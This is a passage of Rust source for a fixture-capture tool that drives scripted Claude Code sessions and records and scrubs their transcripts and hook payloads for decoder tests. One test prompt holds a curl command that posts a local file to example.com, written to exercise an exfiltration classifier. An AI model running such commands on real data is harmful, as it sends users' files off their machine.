//! `cargo xtask fixtures claude`: capture the Claude Code transcripts and hook payloads that pin
//! `slopty-agent`'s conversation decoder (`crates/slopty-agent/tests/fixtures/conversation`).
//!
//! Each scenario runs the official Claude Code build ([`crate::claude::official`], never
//! whatever `claude` is on `PATH`) headless on haiku, in a scratch directory of its own, with a
//! cheap scripted prompt. The transcript is taken from the `transcript_mirror` frames
//! `--session-mirror` writes on stdout, never from the files under `~/.claude`. Hook payloads
//! come from this binary, registered for the run as the hook (`fixtures hook-sink`) for the events
//! Slopty's relay hears (`slopty_agent::hooks::EVENTS`), and as the relay is: asynchronously, so
//! Claude Code never waits on it and its payloads come when the relay's would. With no person at
//! a dialog in `-p`, the sink stands in for one at a permission request: it allows the call or
//! refuses it, as the TUI's dialog would, so for those events Claude Code waits on it.
//!
//! The order the transcript's writes and the hooks reached the run in is kept beside them
//! (`arrivals.jsonl`): each line says how many of a file's lines came next, and when, in
//! milliseconds since the first. Replaying the files in it is replaying what Slopty heard.
//!
//! No user or project settings are loaded (`--setting-sources ""`), and everything written is
//! scrubbed: the scratch directory becomes `/work`, the home directory `/home/user`, the user
//! name `user`, and every session, message, request, tool-call, agent and background-task id a
//! stable placeholder numbered in order of appearance. Attachments keep only their type (they
//! carry the environment, skill and model listings), except the queued commands that report a
//! background task. A fixture is a scripted exchange with a model, never a person's conversation.

use std::collections::HashMap;
use std::io::{BufRead as _, BufReader, Read as _, Write as _};
use std::path::{Path, PathBuf};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::mpsc;
use std::time::{Duration, Instant, SystemTime};

use anyhow::{Context as _, Result, bail, ensure};
use clap::Subcommand;
use serde_json::{Map, Value, json};

use crate::tools::repo_root;

#[derive(Subcommand)]
pub enum FixturesCmd {
    /// Capture every scenario, or the one named, with the official Claude Code build.
    Claude {
        /// Capture only this scenario.
        #[arg(long)]
        only: Option<String>,
        /// The Claude Code release to capture with.
        #[arg(long, default_value = crate::claude::VERSION)]
        version: String,
    },
    /// Record what Slopty's Claude Code mod relays while a person types in the TUI, and the
    /// queue and image store Claude Code keeps meanwhile, with the official build, no account
    /// and no model, into `crates/slopty-agent/tests/fixtures/claude-mod` (`claude_mod`).
    ClaudeMod,
    /// The hook a capture registers: saves the payload on stdin and, standing in for the
    /// person, answers permission requests. Not for people.
    #[command(hide = true)]
    HookSink {
        /// Where the payloads go, one file each.
        dir: PathBuf,
    },
}

pub fn run(cmd: &FixturesCmd) -> Result<()> {
    match cmd {
        FixturesCmd::Claude { only, version } => capture_all(only.as_deref(), version),
        FixturesCmd::ClaudeMod => record_mod(),
        FixturesCmd::HookSink { dir } => hook_sink(dir),
    }
}

/// One scripted run.
struct Scenario {
    name: &'static str,
    /// Files the scratch directory starts with.
    files: &'static [(&'static str, &'static str)],
    /// Prompts, each sent once the previous turn's `result` arrived.
    turns: &'static [&'static str],
    /// `--allowedTools`.
    allowed: &'static str,
    /// Interrupt the turn while this tool runs ([`RUNNING`] after the assistant calls it).
    interrupt_on: Option<&'static str>,
    /// Files the run must leave in the scratch directory, and files it must not.
    expect: &'static [&'static str],
    absent: &'static [&'static str],
    /// Turns the session starts on its own after the last prompt's (a finished background task
    /// wakes it), whose `result` is waited for too.
    wakes: usize,
    /// Answered by the canned Messages API (`crate::canned::FakeApi`) in a scratch home, not by a
    /// model: no account involved, and the model's part is scripted.
    canned: bool,
    /// `--permission-mode`.
    mode: &'static str,
}

const SCENARIOS: &[Scenario] = &[
    Scenario {
        name: "edit",
        files: &[("notes.txt", "alpha\nbeta\ngamma\n")],
        turns: &["Do these steps in order with the named tools, then reply \"done\". \
                  1) Read notes.txt. 2) Edit notes.txt: change beta to BETA. \
                  3) Write notes.txt again with this exact content, four lines: alpha, BETA, \
                  gamma, delta. 4) Read notes.txt lines 2 to 3 only (offset 2, limit 2)."],
        allowed: "Read Edit Write",
        interrupt_on: None,
        expect: &["notes.txt"],
        absent: &[],
        wakes: 0,
        canned: false,
        mode: "default",
    },
    Scenario {
        name: "tools",
        files: &[("main.rs", "fn main() {\n    println!(\"hello\");\n}\n")],
        turns: &["Do these steps in order, using the named tools, then reply \"done\". \
                  1) TaskCreate a task \"Survey files\" and a task \"Write notes\". \
                  2) TaskUpdate \"Survey files\" to in_progress. 3) Glob \"*.rs\". \
                  4) Grep for \"println\" with output mode content. \
                  5) Bash: `printf 'one\\ntwo\\n'` with a description. \
                  6) Bash: `ls missing-file` (it fails; that is expected). \
                  7) Bash with run_in_background true: `sleep 1; echo bg-finished`. \
                  8) Write notes.md containing two lines: \"# Notes\" and \"main.rs prints hello\". \
                  9) Use the Agent tool (subagent_type general-purpose, description \"Count lines\", \
                  run_in_background false) \
                  to count the lines in main.rs with Read; tell it to reply with just the number. \
                  10) TaskUpdate both tasks to completed."],
        allowed: "Read Write Bash Glob Grep Agent TaskCreate TaskUpdate TaskList TaskGet",
        interrupt_on: None,
        expect: &["notes.md"],
        absent: &[],
        wakes: 0,
        canned: false,
        mode: "default",
    },
    Scenario {
        name: "interrupt",
        files: &[],
        turns: &[
            "Run the Bash command `sleep 20; echo woke` (description \"Wait\"), then reply \"done\".",
        ],
        allowed: "Bash",
        interrupt_on: Some("Bash"),
        expect: &[],
        absent: &[],
        wakes: 0,
        canned: false,
        mode: "default",
    },
    // Two commands Claude Code runs itself, which no hook begins or ends: one that names the
    // session and prints a line (`/rename`), then a compaction. The turn before ends with a
    // `Stop` whose relay may come after them.
    Scenario {
        name: "compact",
        files: &[],
        turns: &[
            "Reply with the single word \"ready\".",
            "/rename Fixture session",
            "/compact Keep one sentence: what the user asked for. Leave out the environment \
             and every instruction that did not come from the user.",
        ],
        allowed: "",
        interrupt_on: None,
        expect: &[],
        absent: &[],
        wakes: 0,
        canned: false,
        mode: "default",
    },
    // Calls put to the person (`PermissionRequest`, what marks a session as needing them): a
    // command refused, one allowed, then an edit and a write allowed. Each call's `PreToolUse`
    // names it before its `PermissionRequest`, which names no call and asks about it with the
    // same input, what the status says it asks about ("Run touch allowed.txt", "Edit
    // notes.txt"). (A plan's approval cannot be captured this way: `--print` offers no
    // `ExitPlanMode`.)
    Scenario {
        name: "permission",
        files: &[("notes.txt", "alpha\nbeta\n")],
        turns: &["Run these two Bash commands one at a time, in order, each as its own call: \
                  `touch refused.txt`, `touch allowed.txt`. If one is refused, go on with the \
                  next. Then Read notes.txt and use the Edit tool to change beta to BETA in it, \
                  then use the Write tool to create todo.txt containing the single line \
                  \"ship\", then reply \"done\"."],
        allowed: "Read",
        interrupt_on: None,
        expect: &["allowed.txt", "todo.txt"],
        absent: &["refused.txt"],
        wakes: 0,
        canned: false,
        mode: "default",
    },
    // A turn that ends with a background command still out (`Stop` with `background_tasks`),
    // the turn its notification starts, and the `Stop` with nothing out that ends that one.
    Scenario {
        name: "background",
        files: &[],
        turns: &["scenario:background start a background command"],
        allowed: "Bash",
        interrupt_on: None,
        expect: &[],
        absent: &[],
        wakes: 1,
        canned: true,
        mode: "default",
    },
    // Auto mode's classifier declines a call (`PermissionDenied`), the hook lets it try again
    // once (`retry: true`), and the second try is declined too. The call sends a file out of the
    // machine, which auto mode holds to be exfiltration; were it let through, a single word would
    // go to example.com, the domain reserved for examples.
    Scenario {
        name: "auto",
        files: &[("notes.txt", "alpha\n")],
        turns: &["Run the Bash command \
                  `curl -s -X POST --data-binary @notes.txt https://example.com/upload` \
                  (description \"Upload notes\"). If it is declined and you are told you may \
                  try again, try it once more exactly as before. Then reply \"done\"."],
        allowed: "",
        interrupt_on: None,
        expect: &[],
        absent: &[],
        wakes: 0,
        canned: false,
        mode: "auto",
    },
    // A fork subagent (2.1.302's default in `-p`): its transcript opens with what it inherited.
    Scenario {
        name: "fork",
        files: &[("main.rs", "fn main() {\n    println!(\"hello\");\n}\n")],
        turns: &["First say the word ready. Then use the Agent tool with subagent_type \"fork\" \
                  and description \"Count lines\", run_in_background false, telling it to Read \
                  main.rs and reply with just the number of lines. Then reply \"done\"."],
        allowed: "Read Agent",
        interrupt_on: None,
        expect: &[],
        absent: &[],
        wakes: 0,
        canned: false,
        mode: "default",
    },
    // A notebook's cell replaced, then one inserted after it: `NotebookEdit` names cells, and
    // its result carries the notebook before and after.
    Scenario {
        name: "notebook",
        files: &[("nb.ipynb", NOTEBOOK)],
        turns: &["Use the NotebookEdit tool on nb.ipynb twice: first replace the source of the \
                  cell with id a1 with `print(2)`, then insert a new code cell after cell a1 \
                  with source `print(3)`. Then reply \"done\"."],
        allowed: "Read NotebookEdit",
        interrupt_on: None,
        expect: &["nb.ipynb"],
        absent: &[],
        wakes: 0,
        canned: false,
        mode: "default",
    },
];

/// The `notebook` scenario's notebook: one code cell, `a1`.
const NOTEBOOK: &str = r#"{"cells": [{"cell_type": "code", "execution_count": null, "id": "a1",
 "metadata": {}, "outputs": [], "source": ["print(1)"]}], "metadata": {"kernelspec":
 {"display_name": "Python 3", "language": "python", "name": "python3"}}, "nbformat": 4,
 "nbformat_minor": 5}
"#;

/// Events the sink is registered for: the relay's (`slopty_agent::hooks::EVENTS`), so a capture
/// holds what Slopty hears of a session, and nothing it does not.
const SINK_EVENTS: [&str; 15] = [
    "SessionStart",
    "SessionEnd",
    "UserPromptSubmit",
    "PreToolUse",
    "PostToolUse",
    "PostToolUseFailure",
    "PermissionRequest",
    "PermissionDenied",
    "Notification",
    "Stop",
    "StopFailure",
    "SubagentStart",
    "SubagentStop",
    "PreCompact",
    "PostCompact",
];

/// Events the sink answers for the person, so Claude Code waits on it as on the TUI's dialog;
/// for every other event it runs as Slopty's relay does, without Claude Code waiting.
const ANSWERED: [&str; 2] = ["PermissionRequest", "PermissionDenied"];

/// How long Claude Code lets the sink run, in seconds: what it lets Slopty's relay run
/// (`slopty_agent::hooks::TIMEOUT_S`).
const SINK_TIMEOUT_S: u32 = 5;

/// How long after the last turn the run waits for hooks still running before its input ends:
/// Claude Code cancels the hooks it did not wait for when it exits.
const SETTLE: Duration = Duration::from_secs(10);

/// How long one scenario may run.
const SCENARIO_TIMEOUT: Duration = Duration::from_secs(300);

/// How long after the assistant's call an interrupt goes: past its hooks, into the command it
/// runs (the scenario's sleeps far longer). From 2.1.312 the call's frame comes while the reply
/// still streams, and an interrupt at once stops the reply and refuses the call before it ran.
const RUNNING: Duration = Duration::from_secs(3);

fn capture_all(only: Option<&str>, version: &str) -> Result<()> {
    let claude = crate::claude::official(version)?;
    println!("claude {version} at {}", claude.display());
    let out = repo_root()?.join("crates/slopty-agent/tests/fixtures/conversation");
    let mut ran = 0_usize;
    for scenario in SCENARIOS.iter().filter(|s| only.is_none_or(|name| name == s.name)) {
        let started = Instant::now();
        println!("▶ {}", scenario.name);
        capture(&claude, scenario, out.as_std_path())
            .with_context(|| format!("scenario {}", scenario.name))?;
        println!("  ✓ {} ({:.1?})", scenario.name, started.elapsed());
        ran = ran.saturating_add(1);
    }
    ensure!(ran > 0, "no scenario is named {only:?}");
    Ok(())
}

/// What one run left behind.
#[derive(Default)]
struct Captured {
    /// Transcript records by the file Claude Code wrote them to, in order.
    files: Vec<(String, Vec<Value>)>,
    /// Each write that came, in order: when (nanoseconds since the epoch), its file, and how
    /// many records it held.
    writes: Vec<(u128, String, usize)>,
}

impl Captured {
    fn push(&mut self, path: &str, entries: Vec<Value>) {
        match self.files.iter_mut().find(|(p, _)| p == path) {
            Some((_, records)) => records.extend(entries),
            None => self.files.push((path.to_owned(), entries)),
        }
    }
}

fn capture(claude: &Path, scenario: &Scenario, out: &Path) -> Result<()> {
    let work = PathBuf::from(format!("/tmp/slopty-fixture-{}", scenario.name));
    // Outside the scratch directory, so the agent's own searches never find the payloads.
    let sink = PathBuf::from(format!("/tmp/slopty-fixture-{}-hooks", scenario.name));
    for dir in [&work, &sink] {
        if dir.exists() {
            std::fs::remove_dir_all(dir)?;
        }
        std::fs::create_dir_all(dir)?;
    }
    for (name, text) in scenario.files {
        std::fs::write(work.join(name), text)?;
    }
    let exe = std::env::current_exe()?;
    let hook = |event: &str| {
        json!([{ "hooks": [{
            "type": "command",
            "command": exe.to_string_lossy(),
            "args": ["fixtures", "hook-sink", sink.to_string_lossy()],
            "async": !ANSWERED.contains(&event),
            "timeout": SINK_TIMEOUT_S,
        }] }])
    };
    // Thinking is written to the transcript only as summaries, and only when asked for.
    let settings = json!({
        "showThinkingSummaries": true,
        "hooks": SINK_EVENTS.iter().map(|e| ((*e).to_owned(), hook(e))).collect::<Map<_, _>>(),
    });
    // A canned run gets a scratch home and the fake API, nothing of the person's.
    let canned = if scenario.canned {
        let home = PathBuf::from(format!("/tmp/slopty-fixture-{}-home", scenario.name));
        if home.exists() {
            std::fs::remove_dir_all(&home)?;
        }
        std::fs::create_dir_all(&home)?;
        Some((home, crate::canned::FakeApi::start()?))
    } else {
        None
    };
    let place = |command: &mut Command| {
        if let Some((home, api)) = &canned {
            command
                .env_clear()
                .envs([
                    ("PATH", "/usr/bin:/bin"),
                    ("TMPDIR", "/tmp"),
                    ("ANTHROPIC_API_KEY", "sk-ant-fixture"),
                    ("DISABLE_TELEMETRY", "1"),
                    ("DISABLE_ERROR_REPORTING", "1"),
                    ("DISABLE_AUTOUPDATER", "1"),
                ])
                .env("ANTHROPIC_BASE_URL", format!("http://127.0.0.1:{}", api.port))
                .env("HOME", home);
        }
    };
    let mut command = Command::new(claude);
    place(&mut command);
    let mut child = command
        .args(["-p", "--model", "haiku", "--output-format", "stream-json", "--verbose"])
        .args(["--input-format", "stream-json", "--session-mirror", "--include-hook-events"])
        .args(["--setting-sources", "", "--strict-mcp-config", "--permission-prompts", "none"])
        // From 2.1.295 a session with no settings starts in auto mode, whose classifier decides
        // what the scenarios' allowed tools already settle; the fixtures record `default`, but
        // for the one that records the classifier.
        .args(["--permission-mode", scenario.mode])
        // Haiku 5.5 at its default effort writes no thinking, and the fixtures pin how thinking
        // decodes; at high effort it thinks before each step, as Haiku 4.5 did.
        .args(["--effort", "high"])
        .args(["--allowedTools", scenario.allowed, "--settings", &settings.to_string()])
        .current_dir(&work)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()
        .context("spawn claude")?;
    let captured = drive(scenario, &mut child);
    let _killed = child.kill();
    let status = child.wait()?;
    let captured = captured?;
    ensure!(status.success() || scenario.interrupt_on.is_some(), "claude exited {status}");
    for name in scenario.expect {
        ensure!(work.join(name).exists(), "the run did not leave {name}");
    }
    for name in scenario.absent {
        ensure!(!work.join(name).exists(), "the run left {name}");
    }
    let hooks = sink_payloads(&sink)?;
    let home = match &canned {
        Some((home, _api)) => home.to_string_lossy().into_owned(),
        None => std::env::var("HOME").context("HOME")?,
    };
    write_fixture(scenario, [&sink, &work, &exe], &home, captured, hooks, out)?;
    if let Some((home, _api)) = &canned {
        std::fs::remove_dir_all(home)?;
    }
    std::fs::remove_dir_all(&work)?;
    std::fs::remove_dir_all(&sink)?;
    Ok(())
}

/// Nanoseconds since the epoch, as the sink names its payloads by.
fn now_ns() -> u128 {
    SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).map_or(0, |d| d.as_nanos())
}

/// Feed the turns and collect the mirrored records until `claude` exits. Once the last turn
/// ended, the input ends when no hook runs any more (or [`SETTLE`] passed).
fn drive(scenario: &Scenario, child: &mut Child) -> Result<Captured> {
    let stdout = child.stdout.take().context("stdout")?;
    let (tx, rx) = mpsc::channel::<(u128, String)>();
    std::thread::spawn(move || {
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if tx.send((now_ns(), line)).is_err() {
                break;
            }
        }
    });
    let mut stdin = child.stdin.take();
    let mut turns = scenario.turns.iter();
    if let (Some(input), Some(turn)) = (stdin.as_mut(), turns.next()) {
        send_prompt(input, turn)?;
    }
    let deadline = Instant::now().checked_add(SCENARIO_TIMEOUT).context("deadline")?;
    let mut captured = Captured::default();
    let mut interrupted = false;
    // When the interrupt is due, once the assistant called the tool.
    let mut due: Option<Instant> = None;
    let mut wakes = scenario.wakes;
    // The hooks Claude Code started and has not heard the end of, by id.
    let mut running: Vec<String> = Vec::new();
    // When the input ends at the latest, once the last turn ended.
    let mut close_by: Option<Instant> = None;
    loop {
        if close_by.is_some_and(|by| running.is_empty() || Instant::now() >= by) {
            drop(stdin.take());
            close_by = None;
        }
        if let Some(at) = due
            && Instant::now() >= at
        {
            if let Some(input) = stdin.as_mut() {
                let request = json!({
                    "type": "control_request",
                    "request_id": "fixture-interrupt",
                    "request": { "subtype": "interrupt" },
                });
                writeln!(input, "{request}")?;
                input.flush()?;
            }
            (due, interrupted) = (None, true);
        }
        let left = deadline.saturating_duration_since(Instant::now());
        let next = due.into_iter().chain(close_by).min();
        let wait = next.map_or(left, |at| at.saturating_duration_since(Instant::now()).min(left));
        let (at, line) = match rx.recv_timeout(wait) {
            Ok(line) => line,
            Err(mpsc::RecvTimeoutError::Disconnected) => break,
            Err(mpsc::RecvTimeoutError::Timeout) if next.is_some() && wait < left => continue,
            Err(mpsc::RecvTimeoutError::Timeout) => bail!("timed out"),
        };
        let Ok(frame) = serde_json::from_str::<Value>(&line) else { continue };
        let hook_id = || frame.get("hook_id").and_then(Value::as_str).map(str::to_owned);
        match frame.get("type").and_then(Value::as_str) {
            Some("transcript_mirror") => {
                let path = frame.get("filePath").and_then(Value::as_str).unwrap_or_default();
                let entries = frame.get("entries").and_then(Value::as_array).cloned();
                let entries = entries.unwrap_or_default();
                captured.writes.push((at, path.to_owned(), entries.len()));
                captured.push(path, entries);
            }
            Some("system")
                if frame.get("subtype").and_then(Value::as_str) == Some("hook_started") =>
            {
                running.extend(hook_id());
            }
            Some("system")
                if frame.get("subtype").and_then(Value::as_str) == Some("hook_response") =>
            {
                let id = hook_id();
                running.retain(|r| Some(r) != id.as_ref());
            }
            Some("assistant")
                if !interrupted && due.is_none() && calls(&frame, scenario.interrupt_on) =>
            {
                due = Instant::now().checked_add(RUNNING);
            }
            Some("control_request") => bail!("claude asked the host: {line}"),
            Some("result") => {
                match (stdin.as_mut(), turns.next()) {
                    (Some(input), Some(turn)) => send_prompt(input, turn)?,
                    // A turn the session starts on its own is still to come: keep it open.
                    (Some(_), None) if wakes > 0 => wakes = wakes.saturating_sub(1),
                    (Some(_), None) => close_by = Instant::now().checked_add(SETTLE),
                    (None, _) => {}
                }
            }
            _ => {}
        }
    }
    Ok(captured)
}

/// Whether an assistant frame calls `tool`.
fn calls(frame: &Value, tool: Option<&str>) -> bool {
    let Some(tool) = tool else { return false };
    frame.pointer("/message/content").and_then(Value::as_array).is_some_and(|blocks| {
        blocks.iter().any(|b| b.get("name").and_then(Value::as_str) == Some(tool))
    })
}

fn send_prompt(input: &mut ChildStdin, text: &str) -> Result<()> {
    let message = json!({ "type": "user", "message": { "role": "user", "content": text } });
    writeln!(input, "{message}")?;
    input.flush()?;
    Ok(())
}

/// The hook: save the payload, and answer a permission request by its command as the person
/// would at the TUI's dialog, the way the `permission` scenario expects (refuse the call that
/// says so, allow the rest).
fn hook_sink(dir: &Path) -> Result<()> {
    let mut payload = String::new();
    std::io::stdin().read_to_string(&mut payload)?;
    let input: Value = serde_json::from_str(&payload)?;
    let output = match input.get("hook_event_name").and_then(Value::as_str) {
        Some("PermissionRequest") => Some(permission_answer(&input)),
        // Auto mode's first decline may be tried again; the second stands.
        Some("PermissionDenied") if !denied_before(dir)? => Some(json!({
            "hookSpecificOutput": { "hookEventName": "PermissionDenied", "retry": true }
        })),
        _ => None,
    };
    let stamp = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_nanos();
    let record = json!({ "input": input, "output": output });
    std::fs::write(
        dir.join(format!("{stamp:024}-{}.json", std::process::id())),
        record.to_string(),
    )?;
    if let Some(output) = output {
        print!("{output}");
    }
    Ok(())
}

/// Whether the sink saved a `PermissionDenied` already.
fn denied_before(dir: &Path) -> Result<bool> {
    for entry in std::fs::read_dir(dir)? {
        let text = std::fs::read_to_string(entry?.path())?;
        let record: Value = serde_json::from_str(&text)?;
        if record.pointer("/input/hook_event_name").and_then(Value::as_str)
            == Some("PermissionDenied")
        {
            return Ok(true);
        }
    }
    Ok(false)
}

fn permission_answer(input: &Value) -> Value {
    let command = input.pointer("/tool_input/command").and_then(Value::as_str).unwrap_or_default();
    let decision = if command.contains("refused") {
        json!({ "behavior": "deny", "message": "Refused by the fixture." })
    } else {
        json!({ "behavior": "allow" })
    };
    json!({ "hookSpecificOutput": { "hookEventName": "PermissionRequest", "decision": decision } })
}

/// The sink's records, in the order the hooks ran, each with when it ran (nanoseconds since
/// the epoch, which its file is named by).
fn sink_payloads(dir: &Path) -> Result<Vec<(u128, Value)>> {
    let mut names: Vec<PathBuf> =
        std::fs::read_dir(dir)?.map(|e| e.map(|e| e.path())).collect::<Result<_, _>>()?;
    names.sort();
    names
        .iter()
        .map(|p| {
            let name = p.file_name().context("a payload's file")?.to_string_lossy();
            let stamp = name.split('-').next().unwrap_or_default().parse()?;
            Ok((stamp, serde_json::from_str(&std::fs::read_to_string(p)?)?))
        })
        .collect()
}

/// `paths` are the hook sink, the scratch directory and this binary, in that order.
fn write_fixture(
    scenario: &Scenario,
    paths: [&Path; 3],
    home: &str,
    captured: Captured,
    hooks: Vec<(u128, Value)>,
    out: &Path,
) -> Result<()> {
    let mut scrub = Scrub::new(paths, home)?;
    let (subagents, main): (Vec<_>, Vec<_>) =
        captured.files.into_iter().partition(|(path, _)| path.contains("/subagents/"));
    ensure!(main.len() == 1, "expected one main transcript, got {}", main.len());
    for (_, records) in main.iter().chain(&subagents) {
        for record in records {
            scrub.collect(record);
        }
    }
    for (_, hook) in &hooks {
        scrub.collect(hook);
    }
    let mut names = HashMap::new();
    let dir = out.join(scenario.name);
    if dir.exists() {
        std::fs::remove_dir_all(&dir)?;
    }
    std::fs::create_dir_all(dir.join("subagents"))?;
    for (path, records) in main.into_iter().chain(subagents) {
        let name = if path.contains("/subagents/") {
            let file = Path::new(&path).file_name().context("subagent file")?.to_string_lossy();
            format!("subagents/{}", scrub.text(&file))
        } else {
            "transcript.jsonl".to_owned()
        };
        let lines: Vec<String> = records.into_iter().map(|r| scrub.record(r).to_string()).collect();
        std::fs::write(dir.join(&name), format!("{}\n", lines.join("\n")))?;
        names.insert(path, name);
    }
    // What came when: each write of a transcript, and each hook.
    let mut arrivals: Vec<(u128, &str, usize)> = captured
        .writes
        .iter()
        .filter(|(_, _, records)| *records > 0)
        .filter_map(|(at, path, records)| Some((*at, names.get(path)?.as_str(), *records)))
        .chain(hooks.iter().map(|(at, _)| (*at, "hooks.jsonl", 1)))
        .collect();
    arrivals.sort_by_key(|(at, ..)| *at);
    let first = arrivals.first().map_or(0, |(at, ..)| *at);
    let arrivals: Vec<String> = arrivals
        .into_iter()
        .map(|(at, file, lines)| {
            let ms = u64::try_from(at.saturating_sub(first) / 1_000_000).unwrap_or(u64::MAX);
            json!({ "file": file, "lines": lines, "ms": ms }).to_string()
        })
        .collect();
    std::fs::write(dir.join("arrivals.jsonl"), format!("{}\n", arrivals.join("\n")))?;
    let hooks: Vec<String> =
        hooks.into_iter().map(|(_, h)| scrub.value(h, "").to_string()).collect();
    std::fs::write(dir.join("hooks.jsonl"), format!("{}\n", hooks.join("\n")))?;
    if std::fs::read_dir(dir.join("subagents"))?.next().is_none() {
        std::fs::remove_dir(dir.join("subagents"))?;
    }
    Ok(())
}

/// Replaces what names the machine, the person and the run with stable placeholders.
pub struct Scrub {
    literal: Vec<(String, String)>,
    /// Ids that have no shape of their own (agent and background-task ids), collected from the
    /// fields that carry them.
    opaque: Vec<(String, String)>,
    ids: HashMap<String, String>,
    counts: HashMap<&'static str, usize>,
}

impl Scrub {
    fn new([sink, work, exe]: [&Path; 3], home: &str) -> Result<Self> {
        // Longest first: the sink's path begins with the scratch directory's.
        let first = vec![
            (exe.to_string_lossy().into_owned(), "/xtask".to_owned()),
            (format!("/private{}", sink.display()), "/hooks".to_owned()),
            (sink.to_string_lossy().into_owned(), "/hooks".to_owned()),
        ];
        Self::with_places(first, work, home)
    }

    /// `first` replaced before anything else, then the scratch directory `work` (as `/work`),
    /// the home directory `home` (as `/home/user`) and the user's name.
    pub fn with_places(first: Vec<(String, String)>, work: &Path, home: &str) -> Result<Self> {
        let work = work.to_string_lossy().into_owned();
        let private = format!("/private{work}");
        let escape = |p: &str| p.replace(|c: char| !c.is_ascii_alphanumeric(), "-");
        let uid = std::os::unix::fs::MetadataExt::uid(&std::fs::metadata(home)?);
        let mut literal = first;
        literal.extend([
            (private.clone(), "/work".to_owned()),
            (work.clone(), "/work".to_owned()),
            (escape(&private), "-work".to_owned()),
            (escape(&work), "-work".to_owned()),
            (format!("claude-{uid}"), "claude-uid".to_owned()),
            (home.to_owned(), "/home/user".to_owned()),
        ]);
        if let Ok(user) = std::env::var("USER")
            && user.len() >= 3
        {
            literal.push((user, "user".to_owned()));
        }
        Ok(Self { literal, opaque: Vec::new(), ids: HashMap::new(), counts: HashMap::new() })
    }

    /// Learn the opaque ids a value carries.
    pub fn collect(&mut self, value: &Value) {
        match value {
            Value::Object(map) => {
                for (key, v) in map {
                    let kind = match key.as_str() {
                        "agentId" | "agent_id" => Some("agent"),
                        "backgroundTaskId" => Some("task"),
                        _ => None,
                    };
                    if let (Some(kind), Some(id)) = (kind, v.as_str()) {
                        self.opaque_id(kind, id);
                    }
                    self.collect(v);
                }
            }
            Value::Array(items) => items.iter().for_each(|v| self.collect(v)),
            // A task notification names the background task, which may be one no field did.
            Value::String(s) => {
                let named = s.split("<task-id>").skip(1).filter_map(|t| t.split_once("</task-id>"));
                for (id, _) in named {
                    let kind = if id.starts_with('a') { "agent" } else { "task" };
                    self.opaque_id(kind, id);
                }
            }
            _ => {}
        }
    }

    fn opaque_id(&mut self, kind: &'static str, id: &str) {
        if id.is_empty() || self.opaque.iter().any(|(from, _)| from == id) {
            return;
        }
        let n = self.next(kind);
        let to = match kind {
            "agent" => format!("a{n:016}"),
            _ => format!("b{n:08}"),
        };
        self.opaque.push((id.to_owned(), to));
    }

    fn next(&mut self, kind: &'static str) -> usize {
        let n = self.counts.entry(kind).or_default();
        *n = n.saturating_add(1);
        *n
    }

    /// One transcript record: attachments keep only their type, except the queued commands
    /// that report background work.
    pub fn record(&mut self, mut record: Value) -> Value {
        if record.get("type").and_then(Value::as_str) == Some("attachment")
            && let Some(attachment) = record.get_mut("attachment")
            && attachment.get("type").and_then(Value::as_str) != Some("queued_command")
        {
            let kind = attachment.get("type").cloned().unwrap_or(Value::Null);
            *attachment = json!({ "type": kind });
        }
        self.value(record, "")
    }

    pub fn value(&mut self, value: Value, key: &str) -> Value {
        match value {
            Value::String(_) if key == "signature" => Value::String("sig".to_owned()),
            Value::String(s) => Value::String(self.text(&s)),
            Value::Array(items) => {
                Value::Array(items.into_iter().map(|v| self.value(v, "")).collect())
            }
            Value::Object(map) => Value::Object(
                map.into_iter()
                    .filter(|(k, _)| k != "rendered" && k != "renderedInHumanTurn")
                    .map(|(k, v)| {
                        let v = self.value(v, &k);
                        (self.text(&k), v)
                    })
                    .collect(),
            ),
            other => other,
        }
    }

    pub fn text(&mut self, text: &str) -> String {
        let mut s = text.to_owned();
        for (from, to) in &self.literal {
            s = s.replace(from.as_str(), to);
        }
        for (from, to) in &self.opaque {
            s = s.replace(from.as_str(), to);
        }
        let s = emails(&s);
        let s = self.uuids(&s);
        let s = self.prefixed(&s, "toolu_");
        let s = self.prefixed(&s, "msg_");
        self.prefixed(&s, "req_")
    }

    /// Every UUID becomes `00000000-0000-4000-8000-<n>`.
    fn uuids(&mut self, s: &str) -> String {
        let bytes = s.as_bytes();
        let mut out = String::with_capacity(s.len());
        let mut i = 0;
        while i < bytes.len() {
            if let Some(candidate) = s.get(i..i.saturating_add(36))
                && is_uuid(candidate)
            {
                let id = self.id("uuid", candidate, |n| format!("00000000-0000-4000-8000-{n:012}"));
                out.push_str(&id);
                i = i.saturating_add(36);
                continue;
            }
            let ch = s.get(i..).and_then(|rest| rest.chars().next()).unwrap_or('\u{fffd}');
            out.push(ch);
            i = i.saturating_add(ch.len_utf8());
        }
        out
    }

    /// Every `<prefix><alphanumerics>` becomes `<prefix><n>`.
    fn prefixed(&mut self, s: &str, prefix: &'static str) -> String {
        let mut out = String::with_capacity(s.len());
        let mut rest = s;
        while let Some(at) = rest.find(prefix) {
            let (before, from) = rest.split_at(at);
            out.push_str(before);
            let tail = from.get(prefix.len()..).unwrap_or_default();
            let len = tail.find(|c: char| !c.is_ascii_alphanumeric()).unwrap_or(tail.len());
            if len < 8 {
                out.push_str(prefix);
                rest = tail;
                continue;
            }
            let end = prefix.len().saturating_add(len);
            let token = from.get(..end).unwrap_or(from);
            let id = self.id(prefix, token, |n| format!("{prefix}{n:02}"));
            out.push_str(&id);
            rest = from.get(end..).unwrap_or_default();
        }
        out.push_str(rest);
        out
    }

    fn id(&mut self, kind: &'static str, from: &str, make: impl Fn(usize) -> String) -> String {
        if let Some(to) = self.ids.get(from) {
            return to.clone();
        }
        let to = make(self.next(kind));
        self.ids.insert(from.to_owned(), to.clone());
        to
    }
}

fn is_uuid(s: &str) -> bool {
    s.len() == 36
        && s.char_indices().all(|(i, c)| match i {
            8 | 13 | 18 | 23 => c == '-',
            _ => c.is_ascii_digit() || ('a'..='f').contains(&c),
        })
}

/// Every e-mail address becomes `user@example.com`: a summary the model writes can repeat the
/// account's address from its context.
fn emails(s: &str) -> String {
    let local = |c: char| c.is_ascii_alphanumeric() || "._%+-".contains(c);
    let domain = |c: char| c.is_ascii_alphanumeric() || ".-".contains(c);
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(at) = rest.find('@') {
        let (before, after) = rest.split_at(at);
        let host = after.get(1..).unwrap_or_default();
        let user_start = before.trim_end_matches(local).len();
        let user_len = before.len().saturating_sub(user_start);
